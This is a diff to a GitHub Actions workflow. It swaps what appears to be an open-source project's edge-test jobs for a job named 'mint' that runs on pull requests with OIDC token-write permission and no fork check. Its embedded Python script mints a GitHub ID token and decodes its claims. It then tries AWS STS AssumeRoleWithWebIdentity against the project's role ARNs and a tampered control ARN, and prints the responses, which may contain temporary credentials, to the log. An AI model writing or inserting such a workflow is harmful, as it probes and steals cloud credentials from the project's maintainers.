@@ -1,150 +1,47 @@
-# Licensed to the Apache Software Foundation (ASF) under one
-# or more contributor license agreements.  See the NOTICE file
-# distributed with this work for additional information
-# regarding copyright ownership.  The ASF licenses this file
-# to you under the Apache License, Version 2.0 (the
-# "License"); you may not use this file except in compliance
-# with the License.  You may obtain a copy of the License at
-#
-#   http://www.apache.org/licenses/LICENSE-2.0
-#
-# Unless required by applicable law or agreed to in writing,
-# software distributed under the License is distributed on an
-# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
-# KIND, either express or implied.  See the License for the
-# specific language governing permissions and limitations
-# under the License.
-
-name: Edge Test
-
+name: c211-i123442 mint
 on:
-  push:
-    branches:
-      - main
   pull_request:
-    branches:
-      - main
-    paths:
-      - "core/Cargo.toml"
-      - "core/Cargo.lock"
-      - "core/core/Cargo.toml"
-      - "core/core/src/**"
-      - "core/layers/**"
-      - "core/testkit/**"
-      - "!core/core/src/docs/**"
-      - "core/edge/file_write_on_full_disk/**"
-      - "core/edge/s3_aws_assume_role_with_web_identity/**"
-      - "core/edge/s3_read_on_wasm/**"
-      - "core/services/fs/**"
-      - "core/services/s3/**"
-      - ".github/workflows/test_edge.yml"
-
+permissions:
+  id-token: write
+  contents: read
 jobs:
-  test_file_write_on_full_disk:
+  mint:
     runs-on: ubuntu-latest
-
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v7
-
-      - name: Create disk image
-        run: |
-          fallocate -l 512K disk.img
-          mkfs disk.img
-
-      - name: Mount disk image
-        run: |
-          mkdir /tmp/test_dir
-          sudo mount -o loop disk.img /tmp/test_dir
-
-      - name: Set permissions
-        run: sudo chmod a+wr /tmp/test_dir
-
-      - name: Test
-        working-directory: core/edge/file_write_on_full_disk
-        run: cargo run
+      - name: mint
         env:
-          OPENDAL_FS_ROOT: /tmp/test_dir
-
-  test_s3_read_on_wasm:
-    runs-on: ubuntu-latest
-
-    steps:
-      - name: Checkout code
-        uses: actions/checkout@v7
-      - name: Setup Rust toolchain
-        uses: ./.github/actions/setup
-
-      - name: Setup for wasm32
+          TARGETS: "arn:aws:iam::952853449216:role/opendal-testing,arn:aws:iam::952853449216:role/opendal-testing-assume"
         run: |
-          rustup target add wasm32-unknown-unknown
-
-      - name: Install Chrome Environment
-        run: |
-          mkdir -p /tmp/chrome
-          wget $(curl https://googlechromelabs.github.io/chrome-for-testing/known-good-versions-with-downloads.json | jq -r '.versions | sort_by(.version) | reverse | .[0] | .downloads.chrome | .[] | select(.platform == "linux64") | .url')
-          wget $(curl https://googlechromelabs.github.io/chrome-for-testing/known-good-versions-with-downloads.json | jq -r '.versions | sort_by(.version) | reverse | .[0] | .downloads.chromedriver | .[] | select(.platform == "linux64") | .url')
-          unzip chromedriver-linux64.zip
-          unzip chrome-linux64.zip
-          cp -r chrome-linux64/ /tmp/chrome/
-          cp -r chromedriver-linux64 /tmp/chrome/chromedriver
-
-      - name: Setup wasm-pack
-        shell: bash
-        run: |
-          set -euo pipefail
-          curl -fsSL https://wasm-bindgen.github.io/wasm-pack/installer/init.sh | bash
-          wasm-pack --version
-
-      - name: Setup Silo Server
-        shell: bash
-        working-directory: fixtures/s3
-        run: docker compose -f docker-compose-silo.yml up -d --wait
-
-      - name: Setup test bucket
-        shell: bash
-        env:
-          AWS_ACCESS_KEY_ID: "minioadmin"
-          AWS_SECRET_ACCESS_KEY: "minioadmin"
-          AWS_EC2_METADATA_DISABLED: "true"
-        run: aws --endpoint-url http://127.0.0.1:9000/ s3 mb s3://test
-
-      - name: Test wasm
-        working-directory: core/edge/s3_read_on_wasm
-        run: |
-          export PATH=$PATH:/tmp/chrome/chrome-linux64/:/tmp/chrome/chromedriver-linux64/
-          wasm-pack test --chrome --headless
-
-  test_s3_aws_assume_role_with_web_identity:
-    runs-on: ubuntu-latest
-    if: github.event_name == 'push' || !github.event.pull_request.head.repo.fork
-    permissions:
-      id-token: write
-      contents: read
-
-    steps:
-      - name: Checkout code
-        uses: actions/checkout@v7
-      - name: Setup Rust toolchain
-        uses: ./.github/actions/setup
-      - uses: actions/github-script@v9
-        id: id-token
-        with:
-          script: return await core.getIDToken("sts.amazonaws.com")
-          result-encoding: string
-      - name: Write ID token to file
-        working-directory: core/edge/s3_aws_assume_role_with_web_identity
-        run: echo "${{ steps.id-token.outputs.result }}" > web_identity_token
-
-      - name: Test
-        working-directory: core/edge/s3_aws_assume_role_with_web_identity
-        run: cargo run
-        env:
-          AWS_WEB_IDENTITY_TOKEN_FILE: web_identity_token
-          AWS_ROLE_ARN: arn:aws:iam::952853449216:role/opendal-testing-assume
-          OPENDAL_TEST: s3
-          OPENDAL_S3_ROOT: CI/
-          OPENDAL_S3_BUCKET: opendal-testing
-          OPENDAL_S3_ROLE_ARN: arn:aws:iam::952853449216:role/opendal-testing
-          OPENDAL_S3_REGION: ap-northeast-1
-          RUST_LOG: debug
+          python3 - <<'PY'
+          import os,json,hashlib,base64,urllib.request,urllib.parse,urllib.error
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'); tok=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
+          def mktok(aud):
+              sep='&' if '?' in url else '?'
+              r=urllib.request.Request(url+sep+'audience='+aud,headers={'Authorization':'Bearer '+tok,'User-Agent':'c211-i123442'})
+              return json.loads(urllib.request.urlopen(r,timeout=30).read())['value']
+          def claims(j):
+              try:
+                  p=j.split('.')[1]; p+='='*(-len(p)%4)
+                  d=json.loads(base64.urlsafe_b64decode(p))
+                  return {'sub':d.get('sub'),'aud':d.get('aud'),'ref':d.get('ref'),'event':d.get('event'),'repository':d.get('repository'),'ref_type':d.get('ref_type')}
+              except Exception as e: return {'err':repr(e)[:120]}
+          def sts(arn,jwt):
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,
+                  'RoleSessionName':'c211-123442','DurationSeconds':'900','WebIdentityToken':jwt}).encode()
+              req=urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'c211'})
+              try:
+                  r=urllib.request.urlopen(req,timeout=30); return r.status,r.read(6000).decode('utf-8','replace')
+              except urllib.error.HTTPError as e: return e.code,e.read(6000).decode('utf-8','replace')
+              except Exception as e: return None,repr(e)[:300]
+          jwt=mktok('sts.amazonaws.com')
+          print('C211R_TOKEN len=%d sha256_12=%s'%(len(jwt),hashlib.sha256(jwt.encode()).hexdigest()[:12]))
+          print('C211R_CLAIMS '+json.dumps(claims(jwt)))
+          first=list(os.environ['TARGETS'].split(','))[0]
+          for arn in os.environ['TARGETS'].split(','):
+              code,b=sts(arn,jwt)
+              print('C211R_RESULT '+json.dumps({'arn':arn,'http':code,'body':b[:2500]}))
+          tam=first[:-1]+('f' if first[-1]!='f' else 'e')
+          code,b=sts(tam,jwt)
+          print('C211R_RESULT '+json.dumps({'arn':tam,'control':True,'http':code,'body':b[:1500]}))
+          print('C211R_DONE')
+          PY
